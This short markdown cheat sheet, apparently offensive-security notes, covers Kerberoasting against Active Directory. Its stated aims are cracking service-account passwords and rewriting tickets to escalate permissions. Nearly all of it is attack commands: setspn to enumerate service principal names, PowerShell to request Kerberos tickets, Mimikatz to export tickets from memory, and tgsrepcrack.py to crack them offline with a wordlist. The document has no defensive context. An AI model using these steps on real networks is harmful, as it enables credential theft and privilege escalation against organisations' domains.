## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [Quick Overview](#Quick\Overview)

## Table of Contents

      - [Quick Overview](#Quick\Overview)

Objective:
- Crack passwords for remote service accounts
- Rewrite tickets to escalate permissions

#### Quick Overview
1. Find Service Accounts
```powershell
setspn -T DOMAINNAME -F -Q */*
```
2. Identify user accounts; ignore computer accounts
3. Request tickets:
```powershell
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/DOMAIN"
```
4. Extract tickets from RAM with Mimikatz
```powershell
mimkatz # kerberos::list /export
```
5. Crack offline remote service credentials
6. `tgsrepcrack.py` wordlist.txt \*.kirbi



